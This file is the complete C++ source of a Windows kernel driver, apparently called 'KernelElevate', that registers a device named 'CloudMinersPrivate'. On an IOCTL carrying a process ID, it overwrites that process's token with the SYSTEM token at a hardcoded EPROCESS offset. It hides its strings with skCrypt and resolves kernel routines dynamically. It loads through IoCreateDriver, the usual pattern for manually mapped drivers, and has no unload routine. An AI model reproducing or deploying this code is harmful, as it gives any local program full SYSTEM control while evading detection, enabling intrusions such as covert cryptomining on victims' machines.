#include <ntifs.h>
#include <stdarg.h>
#include "skCrypt.h"

#pragma warning(disable: 6328 6273) // disable DbgPrintEx warnings

typedef NTSTATUS (*IoCreateDriver_t)(PUNICODE_STRING, PDRIVER_INITIALIZE);
typedef NTSTATUS (*IoCreateDevice_t)(PDRIVER_OBJECT, ULONG, PUNICODE_STRING, DEVICE_TYPE, ULONG, BOOLEAN, PDEVICE_OBJECT*);
typedef NTSTATUS (*IoDeleteDevice_t)(PDEVICE_OBJECT);
typedef NTSTATUS (*IofCompleteRequest_t)(PIRP, CCHAR);
typedef NTSTATUS (*PsLookupProcessByProcessId_t)(HANDLE, PEPROCESS*);

typedef PACCESS_TOKEN (*PsReferencePrimaryToken_t)(PEPROCESS);
typedef LONG_PTR (*ObfDereferenceObject_t)(PVOID);

typedef void (*vDbgPrintExWithPrefix_t)(PCCH, ULONG, ULONG, PCCH, va_list);
typedef char* (*PsGetProcessImageFileName_t)(PEPROCESS Process);

constexpr ULONG requestElevate = CTL_CODE(FILE_DEVICE_UNKNOWN, 0x777, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
#define dbgmode

void Log(const char* text, ...) {
    va_list(args);
    va_start(args, text);

    #if defined(dbgmode)
        UNICODE_STRING uvDbgPrintExWithPrefix;
        //vDbgPrintExWithPrefix
        RtlInitUnicodeString(&uvDbgPrintExWithPrefix, skCrypt(L"vDbgPrintExWithPrefix"));
        auto vdbgprintexwithprefix = (vDbgPrintExWithPrefix_t)MmGetSystemRoutineAddress(&uvDbgPrintExWithPrefix);

        (vdbgprintexwithprefix)(skCrypt("[KernelElevate] "), 0, 0, text, args);
    #endif

    va_end(args);
}

bool elevateRights(int PID) {
    UNICODE_STRING uPsGetProcessImageFileName, uPsReferencePrimaryToken, uPsLookupProcessByProcessId, uObDereferenceObject;

    //ObDereferenceObject
    RtlInitUnicodeString(&uObDereferenceObject, skCrypt(L"ObfDereferenceObject"));
    auto obdereferenceobject = (ObfDereferenceObject_t)MmGetSystemRoutineAddress(&uObDereferenceObject);

    //PsLookupProcessByProcessId
    RtlInitUnicodeString(&uPsLookupProcessByProcessId, skCrypt(L"PsLookupProcessByProcessId"));
    auto pslookupprocessbyprocessId = (PsLookupProcessByProcessId_t)MmGetSystemRoutineAddress(&uPsLookupProcessByProcessId);

    PVOID proc = NULL, ntoskrnl = NULL;
    PACCESS_TOKEN targetToken, ntoskrnlToken;
    __try {
        NTSTATUS ret = (pslookupprocessbyprocessId)((HANDLE)PID, (PEPROCESS*)&proc);
        if (ret != STATUS_SUCCESS) {
            if (ret == STATUS_INVALID_PARAMETER) Log(skCrypt("the PID is invalid.\n"));
            if (ret == STATUS_INVALID_CID) Log(skCrypt("the CID is invalid.\n"));

            return FALSE;
        }

        (pslookupprocessbyprocessId)((HANDLE)0x4, (PEPROCESS*)&ntoskrnl);

        if (ret != STATUS_SUCCESS) {
            if (ret == STATUS_INVALID_PARAMETER) Log(skCrypt("ntoskrnl PID was not found.\n"));
            if (ret == STATUS_INVALID_CID) Log(skCrypt("ntoskrnl PID is not valid.\n"));

            (obdereferenceobject)(proc);
            return FALSE;
        }

        //PsGetProcessImageFileName
        RtlInitUnicodeString(&uPsGetProcessImageFileName, skCrypt(L"PsGetProcessImageFileName"));
        auto psgetprocessimagefilename = (PsGetProcessImageFileName_t)MmGetSystemRoutineAddress(&uPsGetProcessImageFileName);

        char* peName;
        Log(skCrypt("pe name: %s\n"), peName = psgetprocessimagefilename((PEPROCESS)proc));

        //PsReferencePrimaryToken
        RtlInitUnicodeString(&uPsReferencePrimaryToken, skCrypt(L"PsReferencePrimaryToken"));
        auto psreferenceprimarytoken = (PsReferencePrimaryToken_t)MmGetSystemRoutineAddress(&uPsReferencePrimaryToken);

        targetToken = (psreferenceprimarytoken)((PEPROCESS)proc);
        if (!targetToken) {
            (obdereferenceobject)(ntoskrnl);
            (obdereferenceobject)(proc);
            return FALSE;
        }

        Log(skCrypt("%s token: %x\n"), peName, targetToken);

        ntoskrnlToken = (psreferenceprimarytoken)((PEPROCESS)ntoskrnl);
        if (!ntoskrnlToken) {
            (obdereferenceobject)(ntoskrnl);
            (obdereferenceobject)(targetToken);
            (obdereferenceobject)(proc);
            return FALSE;
        }

        Log(skCrypt("ntoskrnl token: %x\n"), ntoskrnlToken);
        ULONG_PTR UProcIdAddr = (ULONG_PTR)proc + 0x4b8;

        Log(skCrypt("%s token addr: %x\n"), peName, UProcIdAddr);
        ULONG_PTR ntoskrnladdr = (ULONG_PTR)ntoskrnl + 0x4b8;

        Log(skCrypt("ntoskrnl token addr: %x\n"), ntoskrnladdr);
        *(PHANDLE)UProcIdAddr = *(PHANDLE)ntoskrnladdr;

        Log(skCrypt("%s token upgraded to: %x "), peName, *(PHANDLE)(UProcIdAddr));
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }

    (obdereferenceobject)(ntoskrnl);
    (obdereferenceobject)(targetToken);
    (obdereferenceobject)(ntoskrnlToken);
    (obdereferenceobject)(proc);
    return TRUE;
}

NTSTATUS IoControl(PDEVICE_OBJECT devObj, PIRP irp) {
    UNREFERENCED_PARAMETER(devObj);
    UNICODE_STRING uIoCompleteRequest;

    auto stack = IoGetCurrentIrpStackLocation(irp);
    bool status = false;

    if (stack) {
        const auto ctl_code = stack->Parameters.DeviceIoControl.IoControlCode;
        if (ctl_code == requestElevate) {
            int recvPID = 0;

            RtlCopyMemory(&recvPID, irp->AssociatedIrp.SystemBuffer, sizeof(recvPID));
            status = elevateRights(recvPID);
            Log(skCrypt("received PID: %d\n"), recvPID);
        }
    }

    //IoCompleteRequest
    RtlInitUnicodeString(&uIoCompleteRequest, skCrypt(L"IofCompleteRequest"));
    auto iocompleterequest = (IofCompleteRequest_t)MmGetSystemRoutineAddress(&uIoCompleteRequest);

    (iocompleterequest)(irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

NTSTATUS IoCreateClose(PDEVICE_OBJECT devObj, PIRP irp) {
    UNREFERENCED_PARAMETER(devObj);
    UNICODE_STRING uIoCompleteRequest;

    //IoCompleteRequest
    RtlInitUnicodeString(&uIoCompleteRequest, skCrypt(L"IofCompleteRequest"));
    auto iocompleterequest = (IofCompleteRequest_t)MmGetSystemRoutineAddress(&uIoCompleteRequest);

    (iocompleterequest)(irp, IO_NO_INCREMENT);
    return irp->IoStatus.Status;
}

NTSTATUS RealEntry(PDRIVER_OBJECT driverObj, PUNICODE_STRING registeryPath) {
    UNREFERENCED_PARAMETER(registeryPath);
    UNICODE_STRING uIoCreateDevice, uIoDeleteDevice;

    UNICODE_STRING devName, symLink;
    PDEVICE_OBJECT devObj;

    //IoCreateDevice
    RtlInitUnicodeString(&uIoCreateDevice, skCrypt(L"IoCreateDevice"));
    auto iocreatedevice = (IoCreateDevice_t)MmGetSystemRoutineAddress(&uIoCreateDevice);

    RtlInitUnicodeString(&devName, skCrypt(L"\\Device\\CloudMinersPrivate"));
    auto status = (iocreatedevice)(driverObj, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &devObj);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    auto dosDevice = skCrypt(L"\\DosDevices\\CloudMinersPrivate");
    RtlInitUnicodeString(&symLink, dosDevice);
    status = IoCreateSymbolicLink(&symLink, &devName);
    if (!NT_SUCCESS(status)) {
        //IoDeleteDevice
        RtlInitUnicodeString(&uIoDeleteDevice, skCrypt(L"IoDeleteDevice"));
        auto iodeletedevice = (IoDeleteDevice_t)MmGetSystemRoutineAddress(&uIoDeleteDevice);

        (iodeletedevice)(devObj);
        return status;
    }

    SetFlag(devObj->Flags, DO_BUFFERED_IO);

    driverObj->MajorFunction[IRP_MJ_CREATE] = IoCreateClose;
    driverObj->MajorFunction[IRP_MJ_CLOSE] = IoCreateClose;
    driverObj->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoControl;
    driverObj->DriverUnload = NULL;

    ClearFlag(devObj->Flags, DO_DEVICE_INITIALIZING);

    return status;
}

NTSTATUS EntryPoint(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath) {
    UNREFERENCED_PARAMETER(pDriverObject);
    UNREFERENCED_PARAMETER(pRegistryPath);

    UNICODE_STRING uIoCreateDriver;

    //IoCreateDriver
    RtlInitUnicodeString(&uIoCreateDriver, skCrypt(L"IoCreateDriver"));
    auto iocreatedriver = (IoCreateDriver_t)MmGetSystemRoutineAddress(&uIoCreateDriver);

    UNICODE_STRING drvName;
    RtlInitUnicodeString(&drvName, skCrypt(L"\\Driver\\CloudMinersPrivate"));
    (iocreatedriver)(&drvName, RealEntry);

    return STATUS_SUCCESS;
}
